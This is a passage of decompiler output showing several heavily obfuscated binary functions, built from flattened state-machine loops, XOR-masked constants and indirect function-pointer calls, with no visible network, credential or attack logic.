  local_30 = local_40;
  pcVar5 = local_40;
  iVar6 = DAT_00033294;
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    while( true ) {
                      while( true ) {
                        while( true ) {
                          while( true ) {
                            while( true ) {
                              while( true ) {
                                while( true ) {
                                  while (local_48 == iVar1) {
                                    uVar3 = FUN_00035060(*(uint *)(DAT_000333cc + 0x3322c) ^
                                                         DAT_0003334c,
                                                         *(uint *)(DAT_000333d0 + 0x33238) ^
                                                         DAT_00033350);
                                    uVar3 = FUN_00035060((uVar3 | DAT_00033354) *
                                                         (uVar3 & DAT_00033354) +
                                                         (uVar3 & DAT_00033358) *
                                                         (DAT_00033354 & ~uVar3),DAT_0003335c);
                                    local_48 = iVar1;
                                    if ((uVar3 | DAT_00033360) < DAT_00033364) {
                                      local_48 = -0x504024ae;
                                    }
                                  }
                                  if (local_48 != iVar2) break;
                                  local_48 = DAT_000332c8;
                                }
                                if (local_48 != DAT_000332a4) break;
                                uVar3 = (*(uint *)(DAT_000333e8 + 0x331d8) ^ DAT_000332f4) -
                                        (*(uint *)(DAT_000333e4 + 0x331cc) ^ DAT_000332f0);
                                local_48 = DAT_000332c4;
                                if ((~uVar3 & 0x10 | (uVar3 | DAT_000332f8) & DAT_000332fc |
                                    DAT_00033300) < DAT_00033304) {
                                  local_48 = 0x25a0fe9c;
                                }
                              }
                              if (local_48 != DAT_000332a8) break;
                              local_48 = iVar1;
                            }
                            if (local_48 != DAT_000332ac) break;
                            local_48 = DAT_000332a4;
                          }
                          if (local_48 != DAT_000332b0) break;
                          local_48 = DAT_000332b4;
                          if (*pcVar5 != '\0') {
                            local_48 = -0x12e5e030;
                          }
                        }
                        if (local_48 != DAT_000332b4) break;
                        uVar3 = FUN_00035060(*(uint *)(DAT_000333d4 + 0x32e98) ^ DAT_00033330,
                                             *(uint *)(DAT_000333d8 + 0x32ea4) ^ DAT_00033334);
                        local_48 = DAT_000332b8;
                        if (((uVar3 | DAT_0003333c) * (uVar3 & DAT_0003333c) +
                             (DAT_0003333c & ~uVar3) * (uVar3 & DAT_00033338) | DAT_00033340) +
                            DAT_00033344 < DAT_00033348) {
                          local_48 = 0x1e6baa99;
                        }
                      }
                      if (local_48 != DAT_000332b8) break;
                      uVar3 = *(uint *)(DAT_000333dc + 0x32f10);
                      uVar7 = *(uint *)(DAT_000333e0 + 0x32f18);
                      (*local_38)(local_2c);
                      uVar3 = ((uVar3 ^ DAT_00033318) & DAT_00033314 |
                              (uVar3 ^ 0x209880) & DAT_0003330c) ^
                              ((uVar7 ^ DAT_00033310) & DAT_00033314 |
                              (uVar7 ^ DAT_00033308) & DAT_0003330c);
                      pcVar5 = local_30;
                      iVar6 = DAT_00033294;
                      local_48 = DAT_000332b8;
                      if ((((~uVar3 | 0x53001c0) & DAT_00033320 | uVar3 & DAT_0003331c) ^
                          DAT_00033324) * DAT_00033328 < DAT_0003332c) {
                        local_48 = -0x55d032f6;
                      }
                    }
                    if (local_48 != DAT_000332bc) break;
                    local_48 = DAT_000332d4;
                  }
                  if (local_48 != iVar6) break;
                  iVar4 = FUN_00035060(*(uint *)(DAT_000333b4 + 0x32ff8) ^ DAT_00033398,
                                       *(uint *)(DAT_000333b8 + 0x33004) ^ DAT_0003339c);
                  local_48 = DAT_000332d4;
                  if ((iVar4 + DAT_000333a0 | DAT_000333a4) + DAT_000333a8 < DAT_000333ac) {
                    local_48 = -0x3d0d0800;
                  }
                }
                if (local_48 != DAT_000332c0) break;
                local_48 = DAT_000332d8;
              }
              if (local_48 != DAT_000332c4) break;
              uVar3 = FUN_00035060((*(uint *)(DAT_000333f0 + 0x33058) ^ DAT_000332e0) *
                                   (*(uint *)(DAT_000333ec + 0x3304c) ^ DAT_000332dc) & DAT_000332e4
                                   ,DAT_000332e8);
              local_48 = DAT_000332c0;
              if ((uVar3 & 2) == DAT_000332ec) {
                local_48 = -0xb769113;
              }
            }
            if (local_48 != DAT_000332c8) break;
            iVar4 = FUN_00035060((*(uint *)(DAT_000333c8 + 0x33168) ^ DAT_0003336c) *
                                 (*(uint *)(DAT_000333c4 + 0x3315c) ^ DAT_00033368) + DAT_00033370,
                                 DAT_00033374);
            local_48 = DAT_000332a8;
            if (iVar4 != DAT_00033378) {
              local_48 = -0x6be12587;
            }
          }
          if (local_48 != DAT_000332cc) break;
          (*local_38)(local_2c);
          local_48 = DAT_000332b8;
        }
        if (local_48 != DAT_000332d0) break;
        local_48 = DAT_000332c4;
      }
      if (local_48 != DAT_000332d4) break;
      *pcVar5 = local_38 == (code *)0x0;
      uVar3 = ((*(uint *)(DAT_000333c0 + 0x330ec) ^ DAT_00033380) -
              (*(uint *)(DAT_000333bc + 0x330e0) ^ DAT_0003337c)) + DAT_00033384;
      local_48 = DAT_000332bc;
      if (DAT_00033394 <
          (~((uVar3 - (DAT_00033298 + 2 ^ DAT_00033298) * (uVar3 & DAT_00033388)) + DAT_0003338c) |
          DAT_00033390)) {
        local_48 = -0x6039ab1c;
      }
    }
  } while (local_48 != DAT_000332d8);
  return;
}



// ---- 000333f4  FUN_000333f4  size=1900

undefined4 FUN_000333f4(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  undefined4 uVar6;
  uint uVar7;
  uint uVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int local_88;
  undefined4 local_80 [2];
  undefined4 local_78 [2];
  undefined4 local_70 [2];
  char local_68 [8];
  int local_60 [2];
  int local_58 [3];
  int *local_4c;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 *local_3c;
  undefined4 *local_38;
  char *local_34;
  undefined4 *local_30;
  int *local_2c;
  
  iVar2 = DAT_00033b80;
  iVar1 = DAT_00033b74;
  local_4c = local_58;
  local_2c = local_60;
  local_34 = local_68;
  local_38 = local_70;
  local_30 = local_78;
  local_3c = local_80;
  local_58[0] = DAT_00033b60;
  local_88 = DAT_00033b64;
  iVar9 = DAT_00033b8c;
  iVar10 = DAT_00033b78;
  iVar11 = DAT_00033b7c;
  iVar12 = DAT_00033b9c;
  iVar13 = DAT_00033b64;
  iVar3 = local_88;
  local_48 = param_1;
  uStack_44 = param_2;
  uStack_40 = param_3;
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    while( true ) {
                      while( true ) {
                        while( true ) {
                          while( true ) {
                            while( true ) {
                              while( true ) {
                                while( true ) {
                                  while( true ) {
                                    do {
                                      while( true ) {
                                        while( true ) {
                                          while (local_88 = iVar3, local_88 == iVar1) {
                                            uVar7 = *(uint *)(DAT_00033ce4 + 0x337dc) ^ DAT_00033c2c
                                            ;
                                            uVar8 = *(uint *)(DAT_00033ce8 + 0x337e8) ^ DAT_00033c30
                                            ;
                                            uVar4 = *(uint *)(DAT_00033ce4 + 0x337dc) ^ DAT_00033c34
                                            ;
                                            uVar4 = (uVar8 | uVar4) * (uVar8 & uVar4) +
                                                    ~(uVar8 | uVar7) * (uVar8 & uVar7);
                                            uVar4 = (uVar4 & DAT_00033c3c) - (DAT_00033c38 & ~uVar4)
                                            ;
                                            uVar4 = FUN_00035060((uVar4 & 0x13d80) +
                                                                 (uVar4 | 0x13d80),DAT_00033c40);
                                            iVar9 = DAT_00033b8c;
                                            iVar10 = DAT_00033b78;
                                            iVar11 = DAT_00033b7c;
                                            iVar12 = DAT_00033b9c;
                                            iVar13 = DAT_00033b64;
                                            iVar3 = iVar1;
                                            if (uVar4 < DAT_00033c44) {
                                              iVar3 = -0x3f63935f;
                                            }
                                          }
                                          if (local_88 != iVar13) break;
                                          iVar3 = DAT_00033bbc;
                                          if (*local_4c == DAT_00033cbc) {
                                            iVar3 = 0x91b13d2;
                                          }
                                        }
                                        if (local_88 != iVar10) break;
                                        iVar3 = iVar11;
                                        if (((*(uint *)(DAT_00033cf0 + 0x335b0) ^ DAT_00033c1c) -
                                             (*(uint *)(DAT_00033cec + 0x335a4) ^ DAT_00033c18) &
                                            DAT_00033c20) + (DAT_00033b68 ^ DAT_00033b68 + 1) +
                                            DAT_00033c24 < DAT_00033c28) {
                                          iVar3 = 0xb5ff49;
                                        }
                                      }
                                      iVar3 = iVar12;
                                    } while (local_88 == iVar11);
                                    if (local_88 != iVar2) break;
                                    local_88 = DAT_00033ba0;
                                    *local_30 = *local_38;
                                    iVar3 = local_88;
                                  }
                                  if (local_88 != DAT_00033b84) break;
                                  uVar4 = (((*(uint *)(DAT_00033ce0 + 0x33ad8) ^ DAT_00033c4c) -
                                           (*(uint *)(DAT_00033cdc + 0x33acc) ^ DAT_00033c48)) -
                                          (DAT_00033b6c ^ DAT_00033b6c + 1)) + DAT_00033c50;
                                  iVar3 = iVar1;
                                  if (DAT_00033c60 <
                                      ((DAT_00033c58 & ~uVar4 | uVar4 & DAT_00033c54) ^ DAT_00033c5c
                                      )) {
                                    iVar3 = -0x2f0c196b;
                                  }
                                }
                                if (local_88 != DAT_00033b88) break;
                                local_88 = DAT_00033ba8;
                                iVar3 = local_88;
                              }
                              if (local_88 != iVar9) break;
                              *local_30 = 0xffffffff;
                              iVar3 = DAT_00033b90;
                              if (*local_34 != '\0') {
                                iVar3 = 0x75ea0eb;
                              }
                            }
                            if (local_88 != DAT_00033b90) break;
                            uVar6 = (*(code *)*local_2c)(local_48,uStack_44,uStack_40);
                            *local_38 = uVar6;
                            local_88 = DAT_00033b78;
                            iVar9 = DAT_00033b8c;
                            iVar10 = DAT_00033b78;
                            iVar11 = DAT_00033b7c;
                            iVar12 = DAT_00033b9c;
                            iVar13 = DAT_00033b64;
                            iVar3 = local_88;
                          }
                          if (local_88 != DAT_00033b94) break;
                          local_88 = iVar1;
                          iVar3 = local_88;
                        }
                        if (local_88 != DAT_00033b98) break;
                        *local_34 = *local_2c == 0;
                        uVar7 = *(uint *)(DAT_00033cd8 + 0x33738) ^ DAT_00033c68;
                        uVar4 = *(uint *)(DAT_00033cd4 + 0x3372c) ^ DAT_00033c70;
                        uVar4 = (uVar4 | uVar7) * (uVar4 & uVar7) +
                                (uVar4 & (*(uint *)(DAT_00033cd8 + 0x33738) ^ DAT_00033c6c)) *
                                (uVar7 & (*(uint *)(DAT_00033cd4 + 0x3372c) ^ DAT_00033c64)) +
                                DAT_00033c74;
                        uVar4 = (uVar4 | DAT_00033c78) & (~uVar4 | DAT_00033c7c);
                        iVar9 = DAT_00033b8c;
                        iVar3 = DAT_00033bac;
                        if (DAT_00033c84 <
                            (~uVar4 | 0xc8000980) * (~uVar4 & 0xc8000980) +
                            (uVar4 & 0xc8000980) * (DAT_00033c80 & ~uVar4)) {
                          iVar3 = -0x1c36689b;
                        }
                      }
                      if (local_88 != iVar12) break;
                      uVar7 = *(uint *)(DAT_00033cf4 + 0x33918) ^ DAT_00033bf8;
                      uVar8 = *(uint *)(DAT_00033cf8 + 0x33928) ^ DAT_00033bfc;
                      uVar4 = *(uint *)(DAT_00033cf4 + 0x33918) ^ DAT_00033c00;
                      uVar4 = (uVar8 | uVar4) * (uVar8 & uVar4) + ~(uVar8 | uVar7) * (uVar8 & uVar7)
                      ;
                      iVar9 = DAT_00033b8c;
                      iVar3 = iVar2;
                      if ((((uVar4 | DAT_00033c04) * (uVar4 & DAT_00033c04) +
                           (uVar4 & DAT_00033c08) * (DAT_00033c04 & ~uVar4)) * DAT_00033c0c &
                          DAT_00033c10) == DAT_00033c14) {
                        iVar3 = -0x6aa50a90;
                      }
                    }
                    if (local_88 != DAT_00033ba0) break;
                    *local_3c = *local_30;
                    uVar4 = (*(uint *)(DAT_00033d00 + 0x33668) ^ DAT_00033bd8) *
                            (*(uint *)(DAT_00033cfc + 0x33658) ^ DAT_00033bd4);
                    uVar4 = (DAT_00033b70 ^ DAT_00033b70 + 2) * (uVar4 & DAT_00033be0) -
                            (uVar4 ^ DAT_00033bdc);
                    uVar4 = (uVar4 | DAT_00033be4) * (uVar4 & DAT_00033be4) +
                            (uVar4 & DAT_00033be8) * (DAT_00033be4 & ~uVar4);
                    iVar9 = DAT_00033b8c;
                    iVar3 = DAT_00033bb8;
                    if (((uVar4 | DAT_00033bf0) & (uVar4 ^ DAT_00033bec)) < DAT_00033bf4) {
                      iVar3 = 0x3a0a5691;
                    }
                  }
                  if (local_88 != DAT_00033ba4) break;
                  local_88 = DAT_00033bbc;
                  iVar3 = local_88;
                }
                if (local_88 != DAT_00033ba8) break;
                iVar3 = DAT_00033b98;
                if ((((*(uint *)(DAT_00033cd0 + 0x33a0c) ^ DAT_00033c8c) +
                      (*(uint *)(DAT_00033ccc + 0x33a00) ^ DAT_00033c88) & DAT_00033c90) +
                     DAT_00033c94 | DAT_00033c98) < DAT_00033c9c) {
                  iVar3 = 0x2aa5c2bd;
                }
              }
              if (local_88 != DAT_00033bac) break;
              local_88 = DAT_00033b84;
              iVar3 = local_88;
            }
            if (local_88 != DAT_00033bb0) break;
            local_88 = DAT_00033b98;
            iVar3 = local_88;
          }
          if (local_88 != DAT_00033bb4) break;
          iVar5 = FUN_00035060(*(uint *)(DAT_00033d04 + 0x339a8) ^ DAT_00033bc4,
                               *(uint *)(DAT_00033d08 + 0x339b4) ^ DAT_00033bc8);
          iVar9 = DAT_00033b8c;
          iVar10 = DAT_00033b78;
          iVar11 = DAT_00033b7c;
          iVar12 = DAT_00033b9c;
          iVar13 = DAT_00033b64;
          iVar3 = DAT_00033bb8;
          if ((uint)(iVar5 + DAT_00033bcc) < DAT_00033bd0) {
            iVar3 = 0x4b9ccc73;
          }
        }
        if (local_88 != DAT_00033bb8) break;
        local_88 = DAT_00033bb4;
        iVar3 = local_88;
      }
      if (local_88 != DAT_00033bbc) break;
      *local_2c = *(int *)(DAT_00033cc0 + 0x33898);
      uVar4 = *(uint *)(DAT_00033cc4 + 0x33894) ^ DAT_00033ca8;
      uVar7 = *(uint *)(DAT_00033cc8 + 0x338b8) ^ DAT_00033cb4;
      iVar9 = DAT_00033b8c;
      iVar10 = DAT_00033b78;
      iVar11 = DAT_00033b7c;
      iVar12 = DAT_00033b9c;
      iVar3 = DAT_00033bbc;
      if (((uVar7 & DAT_00033cac | (*(uint *)(DAT_00033cc8 + 0x338b8) ^ DAT_00033cb0) & DAT_00033ca4
           ) ^ (uVar4 & DAT_00033cac |
               (*(uint *)(DAT_00033cc4 + 0x33894) ^ DAT_00033ca0) & DAT_00033ca4) | ~(uVar7 | uVar4)
          ) != DAT_00033cb8) {
        iVar3 = -0x448afcc5;
      }
    }
    iVar3 = local_88;
  } while (local_88 != DAT_00033bc0);
  return *local_3c;
}



// ---- 00033d0c  FUN_00033d0c  size=1864

undefined4 FUN_00033d0c(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  bool bVar12;
  bool bVar13;
  int local_80;
  undefined4 local_78 [2];
  undefined4 local_70 [2];
  undefined4 local_68 [2];
  char local_60 [8];
  int local_58 [2];
  uint local_50 [2];
  uint *local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 *local_3c;
  undefined4 *local_38;
  char *local_34;
  undefined4 *local_30;
  int *local_2c;
  
  uVar3 = DAT_000345b0;
  iVar2 = DAT_00034490;
  iVar1 = DAT_0003448c;
  local_48 = local_50;
  local_2c = local_58;
  local_34 = local_60;
  local_38 = local_68;
  local_30 = local_70;
  local_3c = local_78;
  uVar5 = *(uint *)(DAT_000345dc + 0x33d8c) ^ DAT_00034458 |
          *(uint *)(DAT_000345d8 + 0x33d7c) ^ DAT_00034454;
  uVar5 = uVar5 + ((DAT_0003445c | 1) ^ DAT_0003445c) + (~uVar5 | DAT_00034460) + DAT_00034464;
  local_50[0] = (~uVar5 | DAT_0003446c) + uVar5 + ((DAT_00034468 | 1) ^ DAT_00034468) & DAT_00034470
  ;
  local_80 = DAT_00034474;
  iVar8 = DAT_00034494;
  iVar9 = DAT_000344b0;
  iVar10 = DAT_000344c0;
  iVar11 = DAT_000344c4;
  local_44 = param_1;
  local_40 = param_2;
LAB_00033e24:
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while (local_80 == iVar1) {
                    uVar4 = (*(code *)*local_2c)(local_44,local_40);
                    *local_38 = uVar4;
                    local_80 = DAT_000344d4;
                    iVar8 = DAT_00034494;
                    iVar10 = DAT_000344c0;
                    iVar11 = DAT_000344c4;
                  }
                  if (local_80 != iVar2) break;
                  uVar5 = *(uint *)(DAT_00034608 + 0x343b4) ^ *(uint *)(DAT_00034604 + 0x343ac);
                  uVar6 = uVar5 ^ DAT_00034550;
                  uVar7 = uVar6 | DAT_00034554;
                  local_80 = iVar10;
                  if (DAT_00034568 <
                      (uVar6 | DAT_0003455c) * (uVar7 & DAT_00034560) +
                      ((uVar5 ^ DAT_00034548) & DAT_0003454c) * (uVar7 & DAT_00034558) +
                      DAT_00034564) {
                    local_80 = 0x69629067;
                  }
                }
                if (local_80 != iVar8) break;
                *local_30 = *local_38;
                local_80 = iVar11;
              }
              if (local_80 != DAT_00034498) break;
              *local_2c = *(int *)(DAT_000345e0 + 0x3435c);
              uVar5 = FUN_00035060((*(uint *)(DAT_000345e8 + 0x34358) ^ DAT_000345c0) -
                                   (*(uint *)(DAT_000345e4 + 0x3434c) ^ DAT_000345bc) ^ DAT_000345c4
                                   ,DAT_000345c8);
              iVar8 = DAT_00034494;
              iVar10 = DAT_000344c0;
              iVar11 = DAT_000344c4;
              local_80 = iVar9;
              if ((uVar5 | DAT_000345cc) < DAT_000345d0) {
                local_80 = -0x2ff35edc;
              }
            }
            if (local_80 != DAT_0003449c) break;
            local_80 = DAT_000344a8;
          }
          if (local_80 != DAT_000344a0) break;
          local_80 = DAT_00034498;
        }
        if (local_80 != DAT_000344a4) break;
        local_80 = DAT_000344bc;
      }
      if (local_80 != DAT_000344a8) break;
      uVar5 = *(uint *)(DAT_00034614 + 0x33fd4) ^ DAT_00034510;
      uVar6 = *(uint *)(DAT_00034618 + 0x33ff0) ^ DAT_00034514;
      uVar5 = uVar6 + uVar5 + (DAT_00034478 + 1 ^ DAT_00034478) + ~(uVar5 & uVar6);
      uVar6 = uVar5 ^ DAT_00034520;
      uVar5 = (uVar6 | DAT_0003451c) * (uVar6 & DAT_0003451c) +
              (uVar6 & DAT_00034524) * ((uVar5 ^ DAT_00034518) & DAT_0003451c) ^ DAT_00034528;
      bVar13 = DAT_0003452c <= uVar5;
      bVar12 = uVar5 == DAT_0003452c;
      local_80 = iVar8;
      iVar9 = DAT_000344b0;
LAB_00034218:
      if (bVar13 && !bVar12) {
        local_80 = -0x45253ca8;
      }
    }
    if (local_80 == DAT_000344ac) {
      local_80 = DAT_000344b4;
      goto LAB_00033e24;
    }
    if (local_80 == iVar9) {
      local_80 = DAT_000344d0;
    }
    else if (local_80 == DAT_000344b4) {
      uVar5 = *(uint *)(DAT_000345fc + 0x34118) ^ DAT_0003456c;
      uVar6 = *(uint *)(DAT_00034600 + 0x34134) ^ DAT_00034570;
      uVar5 = uVar6 + (uVar5 - (DAT_00034480 ^ DAT_00034480 + 2) * (uVar5 & ~(uVar6 ^ uVar5))) +
              DAT_00034574;
      uVar5 = (uVar5 | DAT_0003457c) & (uVar5 ^ DAT_00034578);
      iVar9 = DAT_000344b0;
      local_80 = DAT_000344c8;
      if (((uVar5 | DAT_00034584) & (uVar5 ^ DAT_00034580)) < DAT_00034588) {
        local_80 = -0x5239529f;
      }
    }
    else if (local_80 == DAT_000344b8) {
      local_80 = DAT_000344cc;
    }
    else if (local_80 == DAT_000344bc) {
      *local_34 = *local_2c == 0;
      uVar5 = FUN_00035060((*(uint *)(DAT_000345f8 + 0x34084) ^ DAT_00034590) -
                           (*(uint *)(DAT_000345f4 + 0x34078) ^ DAT_0003458c),DAT_00034594);
      uVar5 = FUN_00035060((~uVar5 | 0x19) & (uVar5 | DAT_00034598),DAT_0003459c);
      iVar8 = DAT_00034494;
      iVar10 = DAT_000344c0;
      iVar11 = DAT_000344c4;
      local_80 = DAT_000344ac;
      if (DAT_000345a0 < uVar5) {
        local_80 = 0x21e378ed;
      }
    }
    else if (local_80 == iVar10) {
      *local_30 = 0;
      local_80 = iVar1;
      if (*local_34 != '\0') {
        local_80 = 0x5f4fe8f9;
      }
    }
    else if (local_80 == DAT_00034474) {
      local_80 = DAT_00034498;
      if (DAT_000345d4 < *local_48) {
        local_80 = -0x2ff35edc;
      }
    }
    else if (local_80 == iVar11) {
      *local_3c = *local_30;
      uVar5 = *(uint *)(DAT_00034620 + 0x33f80) ^ DAT_000344fc |
              *(uint *)(DAT_0003461c + 0x33f74) ^ DAT_000344f8;
      local_80 = DAT_000344cc;
      if (((uVar5 & DAT_00034500) * (DAT_00034484 ^ DAT_00034484 + 2) + (uVar5 ^ DAT_00034500)) *
          DAT_00034508 + DAT_00034504 < DAT_0003450c) {
        local_80 = 0x1e971016;
      }
    }
    else if (local_80 == DAT_000344c8) {
      local_80 = iVar2;
    }
    else if (local_80 == DAT_000344cc) {
      uVar5 = ((*(uint *)(DAT_00034628 + 0x34258) ^ DAT_000344e0) -
              (*(uint *)(DAT_00034624 + 0x34248) ^ DAT_000344dc)) + DAT_000344e4;
      local_80 = DAT_000344cc;
      if (((uVar5 ^ DAT_000344ec) & DAT_000344f0) * (DAT_0003447c + 2 ^ DAT_0003447c) +
          (uVar5 ^ DAT_000344e8) != DAT_000344f4) {
        local_80 = 0x7f34a3d2;
      }
    }
    else if (local_80 == DAT_000344d0) {
      uVar5 = (*(uint *)(DAT_000345f0 + 0x342e4) ^ DAT_000345a8) *
              (*(uint *)(DAT_000345ec + 0x342d4) ^ DAT_000345a4) + DAT_000345ac;
      uVar5 = (uVar5 - (DAT_00034488 ^ DAT_00034488 + 2) * (uVar5 & uVar3)) + uVar3;
      local_80 = DAT_000344bc;
      if (((uVar5 ^ DAT_000345b4) & uVar5) < DAT_000345b8) {
        local_80 = -0x2a76fe11;
      }
    }
    else {
      if (local_80 == DAT_000344d4) {
        uVar5 = *(uint *)(DAT_0003460c + 0x341d8) ^ DAT_00034530;
        uVar6 = *(uint *)(DAT_00034610 + 0x341e4) ^ DAT_00034534;
        uVar5 = (uVar6 | uVar5) & ~(uVar6 & uVar5);
        uVar5 = ((uVar5 ^ DAT_00034538) & uVar5 ^ DAT_0003453c) + DAT_00034540;
        bVar13 = DAT_00034544 <= uVar5;
        bVar12 = uVar5 == DAT_00034544;
        local_80 = DAT_000344a8;
        goto LAB_00034218;
      }
      if (local_80 == DAT_000344d8) {
        return *local_3c;
      }
    }
  } while( true );
}



// ---- 0003462c  FUN_0003462c  size=2088

undefined4 FUN_0003462c(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  undefined4 uVar5;
  int iVar6;
  undefined4 *puVar7;
  int iVar8;
  int iVar9;
  uint uVar10;
  int iVar11;
  int iVar12;
  int **ppiVar13;
  int iVar14;
  int iVar15;
  int *local_98 [2];
  int local_90 [2];
  undefined4 local_88 [2];
  undefined4 local_80 [2];
  undefined4 local_78 [2];
  undefined4 local_70 [2];
  char local_68 [8];
  int local_60 [2];
  uint local_58 [2];
  undefined4 **local_50;
  uint *local_4c;
  undefined4 *local_48;
  undefined4 *local_44;
  char *local_40;
  undefined4 *local_3c;
  int *local_38;
  undefined4 *local_34;
  undefined4 local_30;
  undefined4 local_2c;
  
  local_4c = local_58;
  local_38 = local_60;
  local_40 = local_68;
  local_44 = local_70;
  local_3c = local_78;
  local_34 = local_80;
  local_48 = local_88;
  local_30 = param_1;
  local_2c = param_2;
  uVar3 = FUN_00035060(*(uint *)(DAT_00034fe4 + 0x346a8) ^ DAT_00034e54,
                       *(uint *)(DAT_00034fe8 + 0x346b8) ^ DAT_00034e58);
  local_58[0] = FUN_00035060((uVar3 | DAT_00034e5c) + DAT_00034e60,DAT_00034e64);
  iVar2 = DAT_00034e80;
  iVar1 = DAT_00034e68;
  ppiVar13 = local_98;
  local_98[0] = local_90;
  local_90[0] = DAT_00034e68;
  local_50 = ppiVar13;
  iVar8 = DAT_00034e88;
  iVar9 = DAT_00034eb0;
  iVar11 = DAT_00034ea4;
  iVar12 = DAT_00034e84;
  iVar14 = DAT_00034e8c;
  iVar15 = DAT_00034e90;
  do {
    while (local_90[0] == iVar2) {
      *local_48 = *local_34;
      uVar5 = FUN_00035060((*(uint *)(DAT_0003503c + 0x34bf0) ^ DAT_00034f00 |
                           *(uint *)(DAT_00035038 + 0x34be4) ^ DAT_00034efc) + DAT_00034f04,
                           DAT_00034f08);
      uVar3 = FUN_00035060(uVar5,DAT_00034f0c);
      iVar6 = DAT_00034e94;
      iVar8 = DAT_00034e88;
      iVar12 = DAT_00034e84;
      iVar14 = DAT_00034e8c;
      iVar15 = DAT_00034e90;
      if (uVar3 < DAT_00034f10) {
        iVar6 = 0xff095b3;
      }
LAB_00034e38:
      **ppiVar13 = iVar6;
    }
    if (local_90[0] == iVar12) {
      uVar3 = *(uint *)(DAT_00034ff8 + 0x34964) ^ DAT_00034fb0;
      uVar10 = *(uint *)(DAT_00034ffc + 0x34970) ^ DAT_00034fb4;
      iVar6 = DAT_00034ec4;
      if ((((uVar10 | uVar3) & ~(uVar10 ^ uVar3)) + DAT_00034fb8 & DAT_00034fbc) + DAT_00034fc0 <
          DAT_00034fc4) {
        iVar6 = 0x232d7f71;
      }
      goto LAB_00034e38;
    }
    if (local_90[0] == iVar8) {
      **ppiVar13 = iVar11;
    }
    else if (local_90[0] == iVar14) {
      FUN_0002d8bc(local_30,local_2c);
      iVar15 = DAT_00034e90;
      iVar14 = DAT_00034e8c;
      iVar8 = DAT_00034e88;
      iVar12 = DAT_00034e84;
      **ppiVar13 = DAT_00034edc;
    }
    else {
      if (local_90[0] == iVar15) {
        uVar3 = (*(uint *)(DAT_0003500c + 0x34e00) ^ DAT_00034f88) &
                (*(uint *)(DAT_00035008 + 0x34df4) ^ 0x80a80);
        iVar6 = DAT_00034ea8;
        if ((uVar3 & (uVar3 ^ 0x19000a80) & DAT_00034f8c) * DAT_00034f90 - DAT_00034f94 != 0) {
          iVar6 = 0x2659cdf8;
        }
        goto LAB_00034e38;
      }
      iVar6 = iVar8;
      if (local_90[0] == iVar1) {
        if (*local_4c < DAT_00034fe0) {
          iVar6 = 0x17d088cb;
        }
        goto LAB_00034e38;
      }
      if (local_90[0] == DAT_00034e94) {
        **ppiVar13 = DAT_00034ea0;
      }
      else if (local_90[0] == DAT_00034e98) {
        **ppiVar13 = DAT_00034ed4;
      }
      else {
        if (local_90[0] == DAT_00034e9c) {
          iVar6 = DAT_00034ec8;
          if (*local_40 != '\0') {
            iVar6 = 0x332c4902;
          }
          goto LAB_00034e38;
        }
        if (local_90[0] == DAT_00034ea0) {
          uVar5 = FUN_00035060(((*(uint *)(DAT_00035044 + 0x34d98) ^ DAT_00034ee8) -
                               (*(uint *)(DAT_00035040 + 0x34d8c) ^ DAT_00034ee4)) + DAT_00034eec,
                               DAT_00034ef0);
          uVar3 = FUN_00035060(uVar5,DAT_00034ef4);
          iVar6 = DAT_00034ee0;
          iVar8 = DAT_00034e88;
          iVar12 = DAT_00034e84;
          iVar14 = DAT_00034e8c;
          iVar15 = DAT_00034e90;
          if (DAT_00034ef8 < uVar3) {
            iVar6 = -0x12132ef;
          }
          goto LAB_00034e38;
        }
        if (local_90[0] == iVar11) {
          *local_38 = *(int *)(DAT_00034fec + 0x34d10);
          uVar3 = (*(uint *)(DAT_00034ff4 + 0x34d10) ^ DAT_00034fcc) -
                  (*(uint *)(DAT_00034ff0 + 0x34d04) ^ DAT_00034fc8);
          uVar3 = (uVar3 - (DAT_00034e6c + 2 ^ DAT_00034e6c) * (uVar3 & DAT_00034fd0)) +
                  DAT_00034fd0 | DAT_00034fd4;
          iVar9 = DAT_00034eb0;
          iVar11 = DAT_00034ea4;
          if ((uVar3 - (DAT_00034e78 ^ DAT_00034e78 + 2) * (uVar3 & DAT_00034fd8)) + DAT_00034fd8 <
              DAT_00034fdc) {
            iVar6 = 0x3546c905;
          }
          goto LAB_00034e38;
        }
        if (local_90[0] == DAT_00034ea8) {
          **ppiVar13 = iVar9;
        }
        else {
          if (local_90[0] == DAT_00034eac) {
            uVar5 = FUN_00035060(*(uint *)(DAT_00035000 + 0x3488c) ^ DAT_00034f98,
                                 *(uint *)(DAT_00035004 + 0x34898) ^ DAT_00034f9c);
            iVar4 = FUN_00035060(uVar5,DAT_00034fa0);
            iVar6 = DAT_00034ec4;
            iVar8 = DAT_00034e88;
            iVar12 = DAT_00034e84;
            iVar14 = DAT_00034e8c;
            iVar15 = DAT_00034e90;
            if (DAT_00034fac < (iVar4 + DAT_00034fa4 | DAT_00034fa8)) {
              iVar6 = 0xd9704d4;
            }
            goto LAB_00034e38;
          }
          if (local_90[0] == iVar9) {
            uVar3 = ((*(uint *)(DAT_00035014 + 0x34c54) ^ DAT_00034f74) -
                    (*(uint *)(DAT_00035010 + 0x34c44) ^ DAT_00034f70)) + DAT_00034f78;
            iVar6 = DAT_00034ec0;
            iVar11 = DAT_00034ea4;
            if ((uVar3 - (DAT_00034e70 ^ DAT_00034e70 + 2) * (uVar3 & DAT_00034f7c)) * DAT_00034f80
                - DAT_00034f84 == 0) {
              iVar6 = 0x2659cdf8;
            }
            goto LAB_00034e38;
          }
          if (local_90[0] == DAT_00034eb4) {
            **ppiVar13 = iVar2;
            puVar7 = local_3c;
LAB_00034cc4:
            *local_34 = *puVar7;
